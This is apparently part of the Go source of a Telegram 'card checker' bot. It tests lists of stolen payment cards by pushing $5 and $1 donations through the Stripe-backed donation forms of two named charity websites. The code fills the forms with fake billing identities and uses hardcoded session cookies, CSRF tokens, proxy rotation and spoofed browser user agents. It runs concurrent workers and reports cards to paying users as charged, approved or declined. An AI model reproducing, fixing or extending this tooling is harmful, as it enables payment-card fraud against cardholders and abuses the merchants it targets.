	req3, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(pmData2.Encode()))
	for k, v := range stripeHdr2 {
		req3.Header.Set(k, v)
	}
	r3, err := client.Do(req3)
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r3.Body.Close()
	r3b, _ := io.ReadAll(r3.Body)
	var pmRes2 map[string]interface{}
	json.Unmarshal(r3b, &pmRes2)
	pmID2, _ := pmRes2["id"].(string)
	if pmID2 == "" {
		msg := "NO_PM"
		if e, ok := pmRes2["error"].(map[string]interface{}); ok {
			if m, ok := e["message"].(string); ok {
				msg = m
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msg, Gateway: "Stripe UHQ $5"}
	}

	// Step 4: Submit donation form
	uniqueID := fmt.Sprintf("%x-%x", rand.Int31(), rand.Int63())
	formData := url.Values{
		"frm_action":            {"create"},
		"form_id":               {"34"},
		"frm_hide_fields_34":    {`["frm_field_636_container"]`},
		"form_key":              {"donations_stripe"},
		"frm_submit_entry_34":   {frmNonce},
		"_wp_http_referer":      {"/donations/donation-form/"},
		"item_meta[584]":        {"GD"},
		"item_meta[585]":        {"6"},
		"item_meta[586]":        {"$ Other"},
		"item_meta[other][586]": {"5"},
		"item_meta[590]":        {"H"},
		"item_meta[591]":        {"REAL"},
		"item_meta[592]":        {"test@test.com"},
		"item_meta[593][line1]": {"ST 26"},
		"item_meta[593][city]":  {"NY"},
		"item_meta[593][state]": {"NY"},
		"item_meta[593][zip]":   {"10080"},
		"item_meta[648]":        {"5"},
		"item_meta[603]":        {"stripe"},
		"stripeToken":           {tokenID},
		"stripeBrand":           {brand},
		"stripeMethod":          {pmID2},
		"unique_id":             {uniqueID},
		"action":                {"frm_entries_create"},
		"nonce":                 {actionNonce},
	}
	req4, _ := http.NewRequest("POST", "https://secondstork.org/wp-admin/admin-ajax.php", strings.NewReader(formData.Encode()))
	req4.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req4.Header.Set("X-Requested-With", "XMLHttpRequest")
	req4.Header.Set("Origin", "https://secondstork.org")
	req4.Header.Set("User-Agent", ssUA)
	r4, err := client.Do(req4)
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r4.Body.Close()
	r4b, _ := io.ReadAll(r4.Body)
	fmt.Printf("[STR2] step4 status=%d card=%s response=%s\n", r4.StatusCode, card, string(r4b))

	var res2 map[string]interface{}
	if err := json.Unmarshal(r4b, &res2); err != nil {
		return fail("BAD_JSON")
	}
	content, _ := res2["content"].(string)
	isPass, _ := res2["pass"].(bool)
	cl := strings.ToLower(content)

	if isPass || strings.Contains(cl, "thank you") {
		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "CHARGED_$5", Amount: "5.00", Gateway: "Stripe UHQ $5"}
	}
	if strings.Contains(cl, "decline") {
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "CARD_DECLINED", Gateway: "Stripe UHQ $5"}
	}
	if strings.Contains(cl, "authentication") || strings.Contains(cl, "3ds") {
		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: "Stripe UHQ $5"}
	}
	if m := regexp.MustCompile(`frm_error_style">([^<]+)`).FindStringSubmatch(content); len(m) >= 2 {
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: m[1], Gateway: "Stripe UHQ $5"}
	}
	trun := content
	if len(trun) > 80 {
		trun = trun[:80]
	}
	return fail("UNKNOWN: " + trun)
}

// ─────────────── Gate: Stripe Dollar ($1 USD) — /str5 ───────────────
// Site: onamissionkc.org

func checkStripeDollarCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv
	fail := func(code string) *CheckResult {
		return &CheckResult{Card: card, Status: StatusError, StatusCode: code, Gateway: "Stripe $1", Retryable: true}
	}

	const (
		cartURL5  = "https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"
		crumb5    = "BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1"
		cookie5   = "crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ss_cvt=1760724937850; __stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; __stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67"
		dollarUA5 = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36"
	)

	client := newHTTPClient(proxyURL, 60*time.Second)
	cartPayload, _ := json.Marshal(map[string]interface{}{
		"amount":            map[string]interface{}{"value": 100, "currencyCode": "USD"},
		"donationFrequency": "ONE_TIME",
		"feeAmount":         nil,
	})

	// Step 1: Get cart token (retry 3x)
	curCartToken := ""
	for attempt := 0; attempt < 3; attempt++ {
		req, _ := http.NewRequest("POST", cartURL5, strings.NewReader(string(cartPayload)))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Origin", "https://www.onamissionkc.org")
		req.Header.Set("Referer", "https://www.onamissionkc.org/donate-now")
		req.Header.Set("Cookie", cookie5)
		req.Header.Set("User-Agent", dollarUA5)
		rc, err := client.Do(req)
		if err != nil {
			if attempt == 2 {
				return fail("CART_TIMEOUT")
			}
			continue
		}
		rcB, _ := io.ReadAll(rc.Body)
		rc.Body.Close()
		if rc.StatusCode != 200 {
			if attempt == 2 {
				fmt.Printf("[STR5] cart fail status=%d card=%s body=%s\n", rc.StatusCode, card, string(rcB))
				return fail(fmt.Sprintf("CART_FAIL_%d", rc.StatusCode))
			}
			continue
		}
		var cj map[string]interface{}
		json.Unmarshal(rcB, &cj)
		redirect, _ := cj["redirectUrlPath"].(string)
		if m := regexp.MustCompile(`cartToken=([^&]+)`).FindStringSubmatch(redirect); len(m) >= 2 {
			curCartToken = m[1]
			break
		}
		if attempt == 2 {
			fmt.Printf("[STR5] cart no token card=%s body=%s\n", card, string(rcB))
			return fail("CART_PARSE_FAIL")
		}
	}
	if curCartToken == "" {
		return fail("CART_TOKEN_FAIL")
	}

	// Step 2: Create payment method
	pmData5 := url.Values{
		"billing_details[address][city]":                 {"Oakford"},
		"billing_details[address][country]":              {"US"},
		"billing_details[address][line1]":                {"Siles Avenue"},
		"billing_details[address][line2]":                {""},
		"billing_details[address][postal_code]":          {"19053"},
		"billing_details[address][state]":                {"PA"},
		"billing_details[name]":                          {"Geroge Washintonne"},
		"billing_details[email]":                         {"grogeh@gmail.com"},
		"type":                                           {"card"},
		"allow_redisplay":                                {"unspecified"},
		"payment_user_agent":                             {"stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent"},
		"referrer":                                       {"https://www.onamissionkc.org"},
		"time_on_page":                                   {"145592"},
		"client_attribution_metadata[client_session_id]": {"22e7d0ec-db3e-4724-98d2-a1985fc4472a"},
		"client_attribution_metadata[merchant_integration_source]":   {"elements"},
		"client_attribution_metadata[merchant_integration_subtype]":  {"payment-element"},
		"client_attribution_metadata[merchant_integration_version]":  {"2021"},
		"client_attribution_metadata[payment_intent_creation_flow]":  {"deferred"},
		"client_attribution_metadata[payment_method_selection_flow]": {"merchant_specified"},
		"client_attribution_metadata[elements_session_config_id]":    {"7904f40e-9588-48b2-bc6b-fb88e0ef71d5"},
		"guid":            {"18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd"},
		"muid":            {"3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48"},
		"sid":             {"9d45db81-2d1e-436a-b832-acc8b6abac4814eb67"},
		"card[number]":    {cc},
		"card[cvc]":       {cvv},
		"card[exp_year]":  {stripeFullYear(yy)},
		"card[exp_month]": {mm},
		"key":             {stripeDollarPK},
		"_stripe_account": {stripeDollarAcct},
	}
	req2, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(pmData5.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Accept", "application/json")
	req2.Header.Set("Origin", "https://js.stripe.com")
	req2.Header.Set("Referer", "https://js.stripe.com/")
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")
	r2, err := client.Do(req2)
	if err != nil {
		return fail("PM_TIMEOUT")
	}
	defer r2.Body.Close()
	r2b, _ := io.ReadAll(r2.Body)
	fmt.Printf("[STR5] pm status=%d card=%s response=%s\n", r2.StatusCode, card, string(r2b))
	var pmRes5 map[string]interface{}
	json.Unmarshal(r2b, &pmRes5)
	pmID5, _ := pmRes5["id"].(string)
	if pmID5 == "" {
		errMsg := "PM_CREATE_FAIL"
		if e, ok := pmRes5["error"].(map[string]interface{}); ok {
			if m, ok := e["message"].(string); ok {
				errMsg = m
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: errMsg, Gateway: "Stripe $1"}
	}

	// Step 3: Place order (retry 3x, refresh cart on stale errors)
	orderBase := map[string]interface{}{
		"email":                          "grogeh@gmail.com",
		"subscribeToList":                false,
		"shippingAddress":                map[string]interface{}{"id": "", "firstName": "", "lastName": "", "line1": "", "line2": "", "city": "", "region": "NY", "postalCode": "", "country": "", "phoneNumber": ""},
		"createNewUser":                  false,
		"newUserPassword":                nil,
		"saveShippingAddress":            false,
		"makeDefaultShippingAddress":     false,
		"customFormData":                 nil,
		"shippingAddressId":              nil,
		"proposedAmountDue":              map[string]interface{}{"decimalValue": "1", "currencyCode": "USD"},
		"billToShippingAddress":          false,
		"billingAddress":                 map[string]interface{}{"id": "", "firstName": "Davide", "lastName": "Washintonne", "line1": "Siles Avenue", "line2": "", "city": "Oakford", "region": "PA", "postalCode": "19053", "country": "US", "phoneNumber": "+1361643646"},
		"savePaymentInfo":                false,
		"makeDefaultPayment":             false,
		"paymentCardId":                  nil,
		"universalPaymentElementEnabled": true,
	}
	for attempt := 0; attempt < 3; attempt++ {
		orderData := make(map[string]interface{}, len(orderBase)+2)
		for k, v := range orderBase {
			orderData[k] = v
		}
		orderData["cartToken"] = curCartToken
		orderData["paymentToken"] = map[string]interface{}{
			"stripePaymentTokenType": "PAYMENT_METHOD_ID",
			"token":                  pmID5,
			"type":                   "STRIPE",
		}
		op, _ := json.Marshal(orderData)
		req3, _ := http.NewRequest("POST", "https://www.onamissionkc.org/api/2/commerce/orders", strings.NewReader(string(op)))
		req3.Header.Set("Content-Type", "application/json")
		req3.Header.Set("Accept", "application/json, text/plain, */*")
		req3.Header.Set("Origin", "https://www.onamissionkc.org")
		req3.Header.Set("Referer", "https://www.onamissionkc.org/checkout?cartToken="+curCartToken)
		req3.Header.Set("X-CSRF-Token", crumb5)
		req3.Header.Set("Cookie", cookie5)
		req3.Header.Set("User-Agent", dollarUA5)
		r3, err := client.Do(req3)
		if err != nil {
			if attempt == 2 {
				return fail("ORDER_TIMEOUT")
			}
			continue
		}
		r3b, _ := io.ReadAll(r3.Body)
		r3.Body.Close()
		fmt.Printf("[STR5] order attempt=%d status=%d card=%s response=%s\n", attempt, r3.StatusCode, card, string(r3b))

		var res5 map[string]interface{}
		json.Unmarshal(r3b, &res5)

		if r3.StatusCode == 200 {
			if _, hasFailure := res5["failureType"]; !hasFailure {
				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "CHARGED_$1", Amount: "1.00", Currency: "USD", Gateway: "Stripe $1"}
			}
		}
		ft, _ := res5["failureType"].(string)
		if ft == "CART_ALREADY_PURCHASED" || ft == "CART_MISSING" || ft == "STALE_USER_SESSION" {
			if attempt == 2 {
				return fail(ft)
			}
			// Refresh cart token
			retryReq, _ := http.NewRequest("POST", cartURL5, strings.NewReader(string(cartPayload)))
			retryReq.Header.Set("Content-Type", "application/json")
			retryReq.Header.Set("Accept", "application/json")
			retryReq.Header.Set("Origin", "https://www.onamissionkc.org")
			retryReq.Header.Set("Cookie", cookie5)
			if retryRC, retryErr := client.Do(retryReq); retryErr == nil {
				retryB, _ := io.ReadAll(retryRC.Body)
				retryRC.Body.Close()
				var rcj map[string]interface{}
				json.Unmarshal(retryB, &rcj)
				if redir, ok := rcj["redirectUrlPath"].(string); ok {
					if tm := regexp.MustCompile(`cartToken=([^&]+)`).FindStringSubmatch(redir); len(tm) >= 2 {
						curCartToken = tm[1]
					}
				}
			}
			continue
		}
		errMsg5 := ft
		if errMsg5 == "" {
			if m, ok := res5["message"].(string); ok {
				errMsg5 = m
			}
			if errMsg5 == "" {
				errMsg5 = "DECLINED"
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: errMsg5, Gateway: "Stripe $1"}
	}
	return fail("ORDER_MAX_RETRIES")
}

// ─────────────── Generic session runner ──────────────────────────────

func runStripeGateSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, fn stripeCheckFn) {
	defer func() {
		unregisterSession(sess)
		close(sess.Done)
	}()

	var progressMsg *tele.Message
	var err error
	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		progressMsg, err = bot.Send(chat, formatProgressMsg(sess), tele.ModeHTML)
		if err == nil {
			break
		}
		fmt.Printf("[SESSION] progress Send attempt %d failed: %v\n", attempt+1, err)
		if attempt < maxRetries-1 {
			time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
		}
	}
	if err != nil {
		bot.Send(chat, "Failed to start check (Telegram send error). Try again.")
		fmt.Printf("[SESSION] failed to send progress message after %d retries: %v\n", maxRetries, err)
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	sess.Cancel = cancel

	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML)
			}
		}
	}()

	type cardResult struct {
		result   *CheckResult
		proxyURL string
		card     string
		lineNum  int
	}
	results := make(chan cardResult, len(sess.Cards))

	workers := max(len(proxies), 1) * 5
	if workers > 30 {
		workers = 30
	}
	if sess.GatewayName == "Razorpay" {
		workers = max(len(proxies)*10, 15)
		if workers > 30 {
			workers = 30
		}
	}
	sem := make(chan struct{}, workers)
	var proxyIdx atomic.Int64
	var wg sync.WaitGroup

	for idx, card := range sess.Cards {
		wg.Add(1)
		go func(c string, lineNum int) {
			defer wg.Done()
			if sess.Cancelled.Load() {
				return
			}
			sem <- struct{}{}
			defer func() { <-sem }()
			if sess.Cancelled.Load() {
				return
			}
			parts := strings.Split(c, "|")
			if len(parts) != 4 {
				results <- cardResult{result: &CheckResult{
					Card:       c,
					Status:     StatusError,
					StatusCode: "BAD_FMT",
					Gateway:    sess.GatewayName,
				}, card: c, lineNum: lineNum}
				return
			}
			pi := int(proxyIdx.Add(1)-1) % len(proxies)
			res := fn(parts[0], parts[1], parts[2], parts[3], proxies[pi])
			results <- cardResult{result: res, proxyURL: proxies[pi], card: c, lineNum: lineNum}
		}(card, sess.OriginalIndices[idx]+1)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	username := sess.Username
	processedCards := make(map[string]bool)
	insufficientCredits := false
	for cr := range results {
		if cr.card != "" {
			processedCards[cr.card] = true
		}
		if sess.Cancelled.Load() {
			continue
		}
		sess.Checked.Add(1)
		fmt.Printf("[CHECK] line %d/%d\n", cr.lineNum, len(sess.Cards))
		_, isFree := um.IncDailyChecked(sess.UserID)
		needsCredits := !isFree && !isAdmin(sess.UserID) && !um.HasUnlimited(sess.UserID)
		r := cr.result
		if r == nil {
			sess.Errors.Add(1)
			continue
		}
		switch r.Status {
		case StatusCharged:
			bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
			handle := sess.ledger.settle(bot, chat, sess, um, formatChargedMsg(r.Card, bin, r, username), username, r, needsCredits)
			if handle == 0 {
				sess.Errors.Add(1)
				continue
			}
		case StatusApproved:
			sess.Approved.Add(1)
			if needsCredits {
				um.DeductCredits(sess.UserID, creditCostApproved)
			}
			if sess.ShowApproved {
				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username), tele.ModeHTML)
			}
		case StatusDeclined:
			sess.Declined.Add(1)
			if sess.ShowDecl {
				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username), tele.ModeHTML)
			}
		default:
			sess.Errors.Add(1)
			fmt.Printf("[STR] unexpected status=%d card=%s statuscode=%s err=%v\n", r.Status, r.Card, r.StatusCode, r.Error)
		}

		if needsCredits && um.GetCredits(sess.UserID) < minCreditsForCheck {
			sess.Cancelled.Store(true)
			insufficientCredits = true
			if sess.Cancel != nil {
				sess.Cancel()
			}
		}
	}

	cancel()
	time.Sleep(100 * time.Millisecond)

	if sess.Cancelled.Load() {
		bot.Edit(progressMsg, "🛑 STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
	} else {
		bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
	}

	if insufficientCredits {
		sendRemainingCards(bot, chat, sess, processedCards)
	}

	um.AddStats(sess.UserID, sess.Checked.Load(), sess.Charged.Load(), sess.Approved.Load(), sess.Declined.Load(), sess.ChargedAmt())
	um.Save()
}

// ─────────────── Command registration helpers ─────────────────────────

// registerStripeInline registers a /cmd handler for inline card-list input.
func registerStripeInline(bot *tele.Bot, cmd, gateName string, um *UserManager, fn stripeCheckFn) {
	bot.Handle(cmd, func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}
		um.SetUsername(uid, c.Sender().Username)
		if !requireCredits(c, um) {
			return nil
		}
		proxies := um.GetProxies(uid)
		if len(proxies) == 0 {
			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}
		text := strings.TrimSpace(c.Message().Payload)
		if text == "" {
			return c.Send("Usage: " + cmd + " number|mm|yy|cvv\nnumber|mm|yy|cvv\n...")
		}
	cards := parseCardsFromText(text)
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
		}
		cards, origIndices, removed := filterValidCards(cards, uid)
		if removed > 0 {
			c.Send(em(emojiCross, "❌") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
		}
		if len(cards) == 0 {
			return c.Send(em(emojiCross, "❌") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
		}
		sess := &CheckSession{
			UserID:          uid,
			Username:        c.Sender().Username,
			SessionID:       generateSessionID(),
			Cards:           cards,
			OriginalIndices: origIndices,
			Total:           len(cards),
			StartTime:       time.Now(),
			ShowDecl:        true,
			ShowApproved:    true,
			GatewayName:     gateName,
			Done:            make(chan struct{}),
			ledger:          ledger,
		}
		registerSession(sess)
		go runStripeGateSession(bot, c.Chat(), sess, proxies, um, fn)
		return nil
	})
}

// registerStripeFile registers a /cmd handler that accepts a .txt file attachment.
// Loaded cards are stored in txtPending; /yes or /no dispatches them via runStripeGateSession.
func registerStripeFile(bot *tele.Bot, cmd, gateName string, um *UserManager, fn stripeCheckFn) {
	bot.Handle(cmd, func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}
		if len(um.GetProxies(uid)) == 0 {
			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}
		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Attach a .txt file or reply to one with " + cmd)
		}
		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("? Failed to read file: " + err.Error())
		}

	cards := parseCardsFromText(string(data))
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
		}
		cards, origIndices, removed := filterValidCards(cards, uid)
		if removed > 0 {
			c.Send(em(emojiCross, "❌") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
		}
		if len(cards) == 0 {
			return c.Send(em(emojiCross, "❌") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
		}
		txtPendingMu.Lock()
		txtPending[uid] = &txtPendingData{
			Cards:           cards,
			OriginalIndices: origIndices,
			ChatID:          c.Chat().ID,
			Username:        c.Sender().Username,
			GateName:        gateName,
			CheckFn:         fn,
		}
		txtPendingMu.Unlock()
		return c.Send(em(emojiDoc, "📋")+fmt.Sprintf(" <b>%d cards loaded.</b> [%s]\n\n"+em(emojiCheck, "💬")+" Show 3DS/approved in chat?\n\n/yes — show approved\n/no — hide approved", len(cards), gateName), tele.ModeHTML)
	})
}
